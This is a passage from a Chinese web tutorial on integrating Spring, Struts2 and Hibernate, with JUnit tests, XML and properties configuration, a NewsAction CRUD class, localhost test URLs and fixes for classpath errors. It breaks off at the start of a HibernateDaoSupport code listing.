finish</li></ul></blockquote><p>使用JUnit进行单个方法的测试：</p><ol><li>选中需要测试的类</li><li>把类进行展开</li><li>把C进行展开</li><li>就可以看到测试类中所有的方法</li><li>点击所需要运行的测试方法然后右键junit运行就行了</li></ol><p><strong>_注意: 在写hql语句的时候表名应该大写表示对象而不是小写，如下所示_</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String hql = "<span class="keyword">update</span> News <span class="keyword">set</span> title=?,<span class="built_in">date</span>=?,<span class="keyword">content</span>=? <span class="keyword">where</span> nid=?<span class="string">";  // 正确</span></span><br><span class="line"><span class="string">String hql = "</span><span class="keyword">update</span> news <span class="keyword">set</span> title=?,<span class="built_in">date</span>=?,<span class="keyword">content</span>=? <span class="keyword">where</span> nid=?<span class="string">";  // 错误</span></span><br></pre></td></tr></table></figure><p>完整JUnit测试代码如下：</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tianxingjian.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.Assert.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.pojo.News;</span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.service.INewsService;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> junit.framework.TestCase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> INewsServiceTest &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ApplicationContext ctx;</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">ctx = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"applicationContext.xml"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> testInsert() &#123;</span><br><span class="line">INewsService service = ctx.getBean(<span class="string">"newsServiceImpl"</span>, INewsService.<span class="keyword">class</span>);</span><br><span class="line">News vo = <span class="keyword">new</span> News();</span><br><span class="line">vo.setTitle(<span class="string">"SSH整合了-"</span> + System.currentTimeMillis());</span><br><span class="line">vo.setDate(<span class="keyword">new</span> Date());</span><br><span class="line">vo.setContent(<span class="string">"SSH内容很丰富！"</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">TestCase.assertEquals(service.insert(vo), <span class="literal">true</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> testUpdate() &#123;</span><br><span class="line">INewsService service = ctx.getBean(<span class="string">"newsServiceImpl"</span>, INewsService.<span class="keyword">class</span>);</span><br><span class="line">News vo = <span class="keyword">new</span> News();</span><br><span class="line">vo.setNid(<span class="number">5</span>);</span><br><span class="line">vo.setTitle(<span class="string">"准备开始学习了！"</span>);</span><br><span class="line">vo.setDate(<span class="keyword">new</span> Date());</span><br><span class="line">vo.setContent(<span class="string">"你高兴么！"</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">TestCase.assertEquals(service.update(vo), <span class="literal">true</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> testGet() &#123;</span><br><span class="line">INewsService service = ctx.getBean(<span class="string">"newsServiceImpl"</span>, INewsService.<span class="keyword">class</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">System.<span class="keyword">out</span>.println(service.get(<span class="number">1</span>));</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> testDelete() &#123;</span><br><span class="line">INewsService service = ctx.getBean(<span class="string">"newsServiceImpl"</span>, INewsService.<span class="keyword">class</span>);</span><br><span class="line">Set&lt;Integer&gt; set = <span class="keyword">new</span> HashSet&lt;Integer&gt;();</span><br><span class="line">set.add(<span class="number">5</span>);</span><br><span class="line">set.add(<span class="number">4</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">TestCase.assertEquals(service.<span class="keyword">delete</span>(set), <span class="literal">true</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> testList() &#123;</span><br><span class="line">INewsService service = ctx.getBean(<span class="string">"newsServiceImpl"</span>, INewsService.<span class="keyword">class</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">System.<span class="keyword">out</span>.println(service.list());</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> testListStringStringIntegerInteger() &#123;</span><br><span class="line">INewsService service = ctx.getBean(<span class="string">"newsServiceImpl"</span>, INewsService.<span class="keyword">class</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">System.<span class="keyword">out</span>.println(service.list(<span class="string">"title"</span>, <span class="string">""</span>, <span class="number">1</span>, <span class="number">3</span>));</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="3-将Spring和Struts2-x进行整合"><a href="#3-将Spring和Struts2-x进行整合" class="headerlink" title="3.将Spring和Struts2.x进行整合"></a><strong>3.将Spring和Struts2.x进行整合</strong></h2><h3 id="3-1-添加Struts2-x的支持"><a href="#3-1-添加Struts2-x的支持" class="headerlink" title="3.1 添加Struts2.x的支持"></a><strong>3.1 添加Struts2.x的支持</strong></h3><blockquote><ul><li>install Struts2.x facet -&gt; next -&gt; next -&gt; √ Spring Plugin -&gt; finish</li></ul></blockquote><h3 id="3-2-为Spring添加监听器，即可在web中使用"><a href="#3-2-为Spring添加监听器，即可在web中使用" class="headerlink" title="3.2 为Spring添加监听器，即可在web中使用"></a><strong>3.2 为Spring添加监听器，即可在web中使用</strong></h3><ul><li>监听器名称：org.springframework.web.context.ContextLoderListen</li></ul><h4 id="3-2-1-在web-xml文件中添加监听器（MyEclipse会自动添加）"><a href="#3-2-1-在web-xml文件中添加监听器（MyEclipse会自动添加）" class="headerlink" title="3.2.1 在web.xml文件中添加监听器（MyEclipse会自动添加）"></a><strong>3.2.1 在web.xml文件中添加监听器（MyEclipse会自动添加）</strong></h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;listener&gt;</span><br><span class="line">    &lt;listener-class&gt;org<span class="selector-class">.springframework</span><span class="selector-class">.web</span><span class="selector-class">.context</span><span class="selector-class">.ContextLoaderListener</span>&lt;/listener-class&gt;</span><br><span class="line">  &lt;/listener&gt;</span><br></pre></td></tr></table></figure><h4 id="3-2-2-在web-xml文件中将applicationContext-xml里的配置设置到Web环境之中-将路径的信息设置为applicationContext-xml属性范围（MyEclipse会自动进行配置）"><a href="#3-2-2-在web-xml文件中将applicationContext-xml里的配置设置到Web环境之中-将路径的信息设置为applicationContext-xml属性范围（MyEclipse会自动进行配置）" class="headerlink" title="3.2.2 在web.xml文件中将applicationContext.xml里的配置设置到Web环境之中,将路径的信息设置为applicationContext.xml属性范围（MyEclipse会自动进行配置）"></a><strong>3.2.2 在web.xml文件中将applicationContext.xml里的配置设置到Web环境之中,将路径的信息设置为applicationContext.xml属性范围（MyEclipse会自动进行配置）</strong></h4><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;context-<span class="built_in">param</span>&gt;</span><br><span class="line">    &lt;<span class="built_in">param</span>-name&gt;contextConfigLocation&lt;/<span class="built_in">param</span>-name&gt;</span><br><span class="line">    &lt;<span class="built_in">param</span>-<span class="built_in">value</span>&gt;classpath:applicationContext.xml&lt;/<span class="built_in">param</span>-<span class="built_in">value</span>&gt;</span><br><span class="line">  &lt;/context-<span class="built_in">param</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="3-3-进行Struts的相关配置"><a href="#3-3-进行Struts的相关配置" class="headerlink" title="3.3 进行Struts的相关配置"></a><strong>3.3 进行Struts的相关配置</strong></h3><h4 id="3-3-1-建立struts-properties文件，这个文件是用于设置对象工厂"><a href="#3-3-1-建立struts-properties文件，这个文件是用于设置对象工厂" class="headerlink" title="3.3.1 建立struts.properties文件，这个文件是用于设置对象工厂"></a><strong>3.3.1 建立struts.properties文件，这个文件是用于设置对象工厂</strong></h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">struts<span class="selector-class">.i18n</span><span class="selector-class">.encoding</span>=UTF-<span class="number">8</span></span><br><span class="line">struts<span class="selector-class">.custom</span><span class="selector-class">.i118n</span><span class="selector-class">.resource</span>=Messages,Pages</span><br><span class="line">struts.objectFactory=spring</span><br></pre></td></tr></table></figure><h4 id="3-1-2-修改struts-xml文件"><a href="#3-1-2-修改struts-xml文件" class="headerlink" title="3.1.2 修改struts.xml文件"></a><strong>3.1.2 修改struts.xml文件</strong></h4><p>本次只是将SSH进行整合，所以只是简单的配置了name、namespace和extends，在实际开发中，需要在package里进行相关跳转路径的配置</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">package</span> name=<span class="string">"root"</span> namespace=<span class="string">"/"</span> <span class="keyword">extends</span>=<span class="string">"struts-default"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/<span class="keyword">package</span>&gt;</span><br></pre></td></tr></table></figure><h4 id="3-1-3-编写NewsAction-java程序，用于进行相关的业务操作"><a href="#3-1-3-编写NewsAction-java程序，用于进行相关的业务操作" class="headerlink" title="3.1.3 编写NewsAction.java程序，用于进行相关的业务操作"></a><strong>3.1.3 编写NewsAction.java程序，用于进行相关的业务操作</strong></h4><p>NewsAction.java的完整代码如下：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tianxingjian.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> org.apache.struts2.ServletActionContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.struts2.convention.annotation.Action;</span><br><span class="line"><span class="keyword">import</span> org.apache.struts2.convention.annotation.Namespace;</span><br><span class="line"><span class="keyword">import</span> org.apache.struts2.convention.annotation.ParentPackage;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Repository;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.pojo.News;</span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.service.INewsService;</span><br><span class="line"></span><br><span class="line">@Repository</span><br><span class="line">@ParentPackage(<span class="string">"root"</span>)</span><br><span class="line">@Namespace(<span class="string">"/pages/news"</span>)</span><br><span class="line">@Action(value=<span class="string">"NewsAction"</span>)</span><br><span class="line">@SuppressWarnings(<span class="string">"serial"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NewsAction</span> <span class="keyword"><span class="keyword">extends</span> <span class="type">ActionSupport</span></span></span>&#123;</span><br><span class="line">@Resource</span><br><span class="line"><span class="keyword">private</span> INewsService <span class="keyword">new</span><span class="type">sService</span>;</span><br><span class="line"><span class="keyword">private</span> News <span class="keyword">new</span><span class="type">s</span> = <span class="keyword">new</span> <span class="type">News</span>();</span><br><span class="line"><span class="keyword">public</span> News getNews() &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span><span class="type">s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> void insert() &#123;</span><br><span class="line">System.out.println(<span class="string">"【新闻数据增加】数据"</span> + <span class="built_in">this</span>.<span class="keyword">new</span><span class="type">s</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">System.out.println(<span class="string">"【新闻数据增加】业务调用结果"</span> + <span class="built_in">this</span>.<span class="keyword">new</span><span class="type">sService</span>.insert(<span class="built_in">this</span>.<span class="keyword">new</span><span class="type">s</span>));</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> void update() &#123;</span><br><span class="line">System.out.println(<span class="string">"【新闻数据修改】数据"</span> + <span class="built_in">this</span>.<span class="keyword">new</span><span class="type">s</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">System.out.println(<span class="string">"【新闻数据修改】业务调用结果"</span> + <span class="built_in">this</span>.<span class="keyword">new</span><span class="type">sService</span>.update(<span class="built_in">this</span>.<span class="keyword">new</span><span class="type">s</span>));</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> void delete() &#123;</span><br><span class="line"><span class="keyword">String</span> ids = ServletActionContext.getRequest().getParameter(<span class="string">"ids"</span>);</span><br><span class="line">System.out.println(<span class="string">"【新闻数据删除】数据"</span> + ids);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">Set&lt;Integer&gt; <span class="keyword">set</span> = <span class="keyword">new</span> <span class="type">HashSet</span>&lt;Integer&gt;();</span><br><span class="line"><span class="keyword">String</span> result [] = ids.split(<span class="string">"_"</span>);</span><br><span class="line"><span class="keyword">for</span> (int x=<span class="number">0</span>; x&lt;result.length; x++) &#123;</span><br><span class="line"><span class="keyword">set</span>.add(Integer.parseInt(result[x]));</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">"【新闻数据删除】业务调用结果"</span> + <span class="built_in">this</span>.<span class="keyword">new</span><span class="type">sService</span>.delete(<span class="keyword">set</span>));</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> void <span class="keyword">get</span>() &#123;</span><br><span class="line">System.out.println(<span class="string">"【新闻数据取得】数据"</span> + <span class="built_in">this</span>.<span class="keyword">new</span><span class="type">s</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">System.out.println(<span class="string">"【新闻数据取得】业务调用结果："</span> + <span class="built_in">this</span>.<span class="keyword">new</span><span class="type">sService</span>.<span class="keyword">get</span>(<span class="built_in">this</span>.<span class="keyword">new</span><span class="type">s</span>.getNid()));</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> void list() &#123;</span><br><span class="line">System.out.println(<span class="string">"【新闻数据查询】数据"</span> + <span class="built_in">this</span>.<span class="keyword">new</span><span class="type">s</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">System.out.println(<span class="string">"【新闻数据查询】业务调用结果："</span> + <span class="built_in">this</span>.<span class="keyword">new</span><span class="type">sService</span>.list());</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> void listSplit() &#123;</span><br><span class="line">System.out.println(<span class="string">"【新闻数据查询】数据"</span> + <span class="built_in">this</span>.<span class="keyword">new</span><span class="type">s</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">System.out.println(<span class="string">"【新闻数据查询】业务调用结果："</span> + <span class="built_in">this</span>.<span class="keyword">new</span><span class="type">sService</span>.list(<span class="string">"title"</span>, <span class="string">""</span>, <span class="number">1</span>, <span class="number">3</span>));</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-1-4-启动Tomcat并进行测试（测试时在地址上进行传参）"><a href="#3-1-4-启动Tomcat并进行测试（测试时在地址上进行传参）" class="headerlink" title="3.1.4 启动Tomcat并进行测试（测试时在地址上进行传参）"></a><strong>3.1.4 启动Tomcat并进行测试（测试时在地址上进行传参）</strong></h4><ul><li>启动Tomcat</li><li><p>访问地址：</p><blockquote><ul><li>添加地址：<a href="http://localhost:8080/SSHDemo/pages/news/NewsAction!insert.action?news.title=&quot;今天好心情！&quot;&amp;news.content=&quot;是的呢！今天好心情啊！！！" target="_blank" rel="noopener">http://localhost:8080/SSHDemo/pages/news/NewsAction!insert.action?news.title=&quot;今天好心情！&quot;&amp;news.content=&quot;是的呢！今天好心情啊！！！</a>“</li><li>更新地址：<a href="http://localhost:8080/SSHDemo/pages/news/NewsAction!update.action?news.nid=5&amp;news.title=&quot;今天好心情！&quot;&amp;news.content=&quot;是的呢！今天好心情啊！！！" target="_blank" rel="noopener">http://localhost:8080/SSHDemo/pages/news/NewsAction!update.action?news.nid=5&amp;news.title=&quot;今天好心情！&quot;&amp;news.content=&quot;是的呢！今天好心情啊！！！</a>“</li><li>删除地址：<a href="http://localhost:8080/SSHDemo/pages/news/NewsAction!delete.action?ids=&quot;6_7" target="_blank" rel="noopener">http://localhost:8080/SSHDemo/pages/news/NewsAction!delete.action?ids=&quot;6_7</a>“</li><li>查询全部：<a href="http://localhost:8080/SSHDemo/pages/news/NewsAction!list.action" target="_blank" rel="noopener">http://localhost:8080/SSHDemo/pages/news/NewsAction!list.action</a></li><li>分页查询：<a href="http://localhost:8080/SSHDemo/pages/news/NewsAction!listSplit.action" target="_blank" rel="noopener">http://localhost:8080/SSHDemo/pages/news/NewsAction!listSplit.action</a></li><li>根据id查询：<a href="http://localhost:8080/SSHDemo/pages/news/NewsAction!get.action?news.nid=6" target="_blank" rel="noopener">http://localhost:8080/SSHDemo/pages/news/NewsAction!get.action?news.nid=6</a></li></ul></blockquote></li><li><p><strong>_在运行的时候有可能会出现以下几个错误：_</strong></p></li></ul><ol><li><p>java.lang.NoSuchMethodError:antlr.collections.AST.getLine()_**<br>解决方案：这个错误的产生原因是Hibernate和Struts中都存在antrl的文件，只需要将低版本的jar文件进行移除就可以了。<br>操作：window -&gt; preference -&gt; lib -&gt; struts2.1 -&gt; core -&gt; 取消antrl的jar文件 -&gt; apply -&gt; 出来后重新刷新如果依然有错就将strutss2进行remove build path然后重新添加</p></li><li><p>Caused by: java.lang.ClassNotFoundException: com.mchange.v2.ser.Indirector<br>解决方案：在官网下载一个mchange-commons-java的jar文件，然后build path并添加到lib中，这样就能配置到项目中了，错误也就消失了，想这种错误都是缺少jar包，只需要下载并配置即可解决</p></li></ol><hr><h2 id="4-HibernateDaoSupport支持类"><a href="#4-HibernateDaoSupport支持类" class="headerlink" title="4. HibernateDaoSupport支持类"></a><strong>4. HibernateDaoSupport支持类</strong></h2><pre><code>    以上实现的SSH整合是在Spring3.x被迫形成的，因为从最早的Spring2和现在的Spring4都会提供一个HibernateDaoSupport类，利用这个类结合HibernateTemplate操作模板就可以轻松地实现，HibernateDaoSupport类里面提供的一系列的操作方法还可以简化Hibernate的编写难度。    在org.springframework.orm.hibernate4.support.HibernateDaoSupport里提供有如下方法：        |- 构造方法：public HibernateDaoSupport();        |- 设置Hibernate操作模板：public final void setHibernateTemplate(HibernateTemplate hibernateTemplate);        |- 取得Hibernate操作模板：public final HibernateTemplate getHibernateTemplate();    如果要想使用这个操作则需要清楚HibernateTemplate的定义，有如下一些方法：        |- 构造方法：public HibernateTemplate();        |- 设置SessionFactory：public void setSessionFactory(SessionFactory sessionFactory);    同时在HibernateTemplate中提供有一些列的简化Hibernate操作的方法。</code></pre><h3 id="4-1-利用HibernateDaoSupport实现操作"><a href="#4-1-利用HibernateDaoSupport实现操作" class="headerlink" title="4.1 利用HibernateDaoSupport实现操作"></a><strong>4.1 利用HibernateDaoSupport实现操作</strong></h3><h4 id="4-1-1-修改applicationContext-xml文件"><a href="#4-1-1-修改applicationContext-xml文件" class="headerlink" title="4.1.1 修改applicationContext.xml文件"></a><strong>4.1.1 修改applicationContext.xml文件</strong></h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean <span class="built_in">id</span>=<span class="string">"hibernateTemplate"</span> <span class="built_in">class</span>=<span class="string">"org.springframework.orm.hibernate4.HibernateTemplate"</span>&gt; </span><br><span class="line">&lt;<span class="keyword">property</span> <span class="built_in">name</span>=<span class="string">"sessionFactory"</span> <span class="keyword">ref</span>=<span class="string">"sessionFactory"</span>/&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure><h4 id="4-1-2-定义NewsDaoImpl子类的时候使用这个操作"><a href="#4-1-2-定义NewsDaoImpl子类的时候使用这个操作" class="headerlink" title="4.1.2 定义NewsDaoImpl子类的时候使用这个操作"></a><strong>4.1.2 定义NewsDaoImpl子类的时候使用这个操作</strong></h4><ul><li>extends HibernateDaoSupport</li><li>不再使用SessionFactory，而是使用HibernateTemplate</li></ul><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">NewsDAOImpl</span><span class="params">(HibernateTemplate ht)</span> </span>&#123;</span><br><span class="line"><span class="keyword">super</span>.setHibernateTemplate(ht);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@Resource</span></span><br><span class="line"><span class="comment">//private SessionFactory sessionFactory;</span></span><br></pre></td></tr></table></figure><ul><li>然后将处理方法中的this.sessionFactory改为super.getHibernateTemplate……</li><li>更改后的NewsDaoImpl.java类如下：</li></ul><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 